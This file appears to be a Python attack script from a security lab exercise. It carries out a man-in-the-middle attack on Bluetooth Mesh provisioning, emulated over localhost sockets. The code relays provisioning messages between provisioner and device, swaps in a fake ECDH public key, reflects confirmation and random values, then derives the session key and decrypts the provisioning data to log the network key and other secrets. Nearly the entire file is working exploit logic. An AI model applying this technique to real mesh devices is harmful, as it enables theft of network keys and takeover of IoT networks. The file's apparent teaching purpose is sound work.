#!/usr/bin/env python3
import logging
from pwn import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from toolbox import *
import select

# Create and configure logger
logger = logging.getLogger('attacker')
logger.setLevel(logging.DEBUG)  # Logger level

# Create console handler for INFO level
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(console_formatter)

# Add handlers to the logger
logger.addHandler(console_handler)


def aes_decrypt(key, ciphertext):
    """
    AES decryption using ECB mode.
    """
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.decrypt(ciphertext)


def fake_prov(s_dev, s_prov, data):
    #TODO
    if data[0:1] == BEACON_TYPE:
        global DeviceUUID
        # Captured DeviceUUID
        DeviceUUID = data[1:17]
        logger.info(f'Caputured DeviceUUID: {DeviceUUID.hex()}')
        s_prov.send(data)
    elif data[0:1] == LINK_ACK_OPCODE:
        logger.info(f'Caputured Link Ack Message: {data.hex()}')
        s_prov.send(data)
    elif data[0:1] == PROVISIONING_CAPABILITIES_OPCODE:
        global provisioning_capabilities
        provisioning_capabilities = data
        logger.info(f'Caputured Provisioning Capabilities: {data.hex()}')
        s_prov.send(data)

    pass

def fake_dev(s_dev, s_prov, data):
    if data == LINK_OPEN_OPCODE + DeviceUUID:
        logger.info(f'Captured Link Open Message: {data.hex()}')
        s_dev.send(data)

    elif data[0:1] == PROVISIONING_INVITE_OPCODE:
        global provisioning_invite
        provisioning_invite = data
        logger.info(f'Caputured Provisioning Invite Message: {data.hex()}')
        s_dev.send(data)

    elif data[0:1] == PROVISIONING_START_OPCODE:
        global provisioning_start
        provisioning_start = data
        logger.info(f'Caputured Provisioning Start Message: {data.hex()}')
        s_dev.send(data)

    elif data[0:1] == PROVISIONING_PUBLIC_KEY_OPCODE:
        # Let Device move on
        s_dev.send(data)
        logger.info(f'Caputured Provisioner Public Key Pair: {data.hex()}')
        # Captured Public Key Pair
        global prov_public_key_x
        prov_public_key_x = data[1:33]
        global prov_public_key_y
        prov_public_key_y = data[33:65]

        # Fake Key Pair
        global fake_dev_private_key, fake_dev_public_key_x, fake_dev_public_key_y
        fake_dev_private_key, fake_dev_public_key_x, fake_dev_public_key_y = generate_key_pair()

        fake_public_key_message = PROVISIONING_PUBLIC_KEY_OPCODE + fake_dev_public_key_x + fake_dev_public_key_y
        s_prov.send(fake_public_key_message)
        logger.info(f'Sent Fake Provisioner Public Key: {fake_public_key_message.hex()}')

    elif data[0:1] == PROVISIONING_CONFIRMATION_OPCODE:
        # Send Confirmation right back to get Random
        s_prov.send(data)
        logger.info('Sent Provisioner Confirmation Back')
    
    elif data[0:1] == PROVISIONING_RANDOM_OPCODE:
        # Send Random right back
        global dev_random
        s_prov.send(data)
        dev_random = data[1:]

        # Fake ECDHSecret for Device
        global ECDHSecret
        ECDHSecret = derive_dhkey(fake_dev_private_key, prov_public_key_x, prov_public_key_y)
        logger.info(f'Derived DHKey for Device: {ECDHSecret.hex()}')

        global dev_confirmation_inputs
        dev_confirmation_inputs = (
            provisioning_invite[1:] + 
            provisioning_capabilities[1:] + 
            provisioning_start[1:] +
            prov_public_key_x + 
            prov_public_key_y + 
            fake_dev_public_key_x + 
            fake_dev_public_key_y
        )
        
    elif data[0:1] == PROVISIONING_DATA_OPCODE:
        confirmation_salt = s1(dev_confirmation_inputs)
        provisioning_salt = s1(confirmation_salt + dev_random + dev_random)
        session_key = k1(ECDHSecret, provisioning_salt, b'prsk')
        nonce = k1(ECDHSecret, provisioning_salt, b'prsn')
        session_nonce = nonce[-13:]
        cipher = AES.new(session_key, AES.MODE_CCM, nonce=session_nonce, mac_len=8)

        encrypted_provisioning_data = data[1:-8]
        provisioning_data_mic = data[-8:]

        try:
            # Decrypt the provisioning data
            provisioning_data = cipher.decrypt_and_verify(encrypted_provisioning_data, provisioning_data_mic)
            logger.info(f'Decrypted Provisioning Data: {provisioning_data.hex()}')
            logger.info(f'NetWorkKey: {provisioning_data[0:16].hex()}')
            logger.info(f'KeyIndex: {provisioning_data[16:18].hex()}')
            logger.info(f'Flags: {provisioning_data[18:19].hex()}')
            logger.info(f'IVIndex: {provisioning_data[19:23].hex()}')
            logger.info(f'UnicastAddress: {provisioning_data[23:25].hex()}')
        except ValueError as e:
            logger.error("Provisioning Data Decryption Failed")
            raise e

        complete_message = PROVISIONING_COMPLETE_OPCODE
        s_prov.send(complete_message)
        logger.info('Sent Complete Message')

    elif data[0:1] == LINK_CLOSE_OPCODE:
        logger.info('Link Closed')
    #TODO
    pass

def sniff():
    # Attacker acts as the middle man, she can sniff and modify all the data between the initiator and the responder
    # To emulate this, the attacker connects to the provisioner and the device to relay the data between them.
    prov_host = '127.0.0.1'
    prov_port = 65432
    prov_conn = remote(prov_host, prov_port)

    dev_host = '127.0.0.1'
    dev_port = 65433
    server = listen(dev_port, bindaddr=dev_host)
    dev_conn = server.wait_for_connection()

    sockets = [dev_conn, prov_conn]

    while True:
        readable, _, _ = select.select(sockets, [], [])
        for s in readable:
            if s == dev_conn:
                data = dev_conn.recv()
                fake_prov(dev_conn, prov_conn, data)
            elif s == prov_conn:
                data = prov_conn.recv()
                fake_dev(dev_conn, s, data)


if __name__ == "__main__":
    sniff()